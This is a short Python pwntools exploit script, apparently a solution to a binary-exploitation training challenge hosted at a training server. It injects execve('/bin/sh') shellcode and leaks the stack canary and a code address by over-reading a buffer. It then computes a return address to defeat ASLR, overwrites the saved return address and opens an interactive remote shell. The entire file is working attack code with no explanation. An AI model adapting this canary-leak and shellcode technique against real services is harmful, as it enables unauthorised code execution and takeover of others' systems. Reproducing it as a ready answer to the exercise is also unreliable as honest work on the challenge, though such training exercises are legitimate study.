from pwn import*

#p = process("./aslr")
p = remote("bin.training.offdef.it", 2012)

#gdb.attach(p,
#'''
#b *(main+335)
#''')

#input("wait")
shellcode = b"\x50\x48\x31\xD2\x48\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xB0\x3B\x41\x5B\x0F\x05\x00"
p.send(shellcode)

#input("wait")
p.send(b"A"*105)

p.recvuntil(b"> ")
p.recv(105)
canary = p.recv(7)
sebp = b"A"*8

offset_stack = 0x88 #136

offset_ps1 = 0x200720 #2098976

#input("wait")
p.send(b"A"*136)
p.recvuntil(b"> ")
p.recv(0x88)
app = p.recv(6) + b"\x00"*2 
ps1 = p64(u64(app) + offset_ps1)

#input("wait")
code = b"A"*104 + b"\x00" + canary + sebp + ps1
p.send(code)

input("wait")
p.send(b"\n")

p.interactive()